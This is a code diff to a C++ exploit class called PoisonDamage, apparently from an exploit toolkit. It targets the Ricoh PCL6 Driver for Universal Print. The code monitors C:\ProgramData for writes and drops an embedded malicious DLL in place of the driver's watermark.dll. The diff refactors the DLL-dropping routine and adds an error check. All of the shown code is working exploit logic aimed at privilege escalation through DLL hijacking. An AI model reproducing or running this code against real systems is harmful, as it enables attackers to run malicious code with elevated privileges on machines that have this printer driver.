@@ -14,7 +14,6 @@ namespace
 {
 #define MAX_BUFFER  4096
 
-    int change_counter = 0;
     const WCHAR* const BaseDirName = L"C:\\ProgramData";
     const WCHAR* TargetDllFullFilePath, * TargetDLLRelFilePath, * MaliciousLibraryFile, * PrinterName;
     DWORD dwNotifyFilter = FILE_NOTIFY_CHANGE_LAST_WRITE |
@@ -37,6 +36,7 @@ namespace
         LPDIRECTORY_INFO di;
         LPOVERLAPPED lpOverlapped;
         PFILE_NOTIFY_INFORMATION fni;
+        int change_counter = 2;
         WCHAR FileName[MAX_PATH];
 
         do {
@@ -125,7 +125,8 @@ namespace
 }
 
 PoisonDamage::PoisonDamage() :
-    Exploit("PCL6 Driver for Universal Print")
+    Exploit("PCL6 Driver for Universal Print"),
+    m_malicious_dll("Dll.dll")
 {
 }
 
@@ -141,10 +142,13 @@ bool PoisonDamage::do_exploit()
     TargetDllFullFilePath = L"C:\\ProgramData\\RICOH_DRV\\PCL6 Driver for Universal Print\\_common\\dlz\\watermark.dll";
     TargetDLLRelFilePath = L"RICOH_DRV\\PCL6 Driver for Universal Print\\_common\\dlz\\watermark.dll";
     MaliciousLibraryFile = L"Dll.dll";
-    change_counter = 2;
 
-    std::cout << "[+] Dropping dll to disk" << std::endl;
+    std::cout << "[+] Dropping " << m_malicious_dll << " to disk" << std::endl;
     std::ofstream dll_out(m_malicious_dll, std::ofstream::out | std::ofstream::binary | std::ofstream::trunc);
+    if (!dll_out.is_open())
+    {
+        std::cerr << "[!] Couldn't write the dll to disk." << std::endl;
+    }
     for (unsigned int i = 0; i < inject_me_dll_len; i++)
     {
         dll_out << inject_me_dll[i];
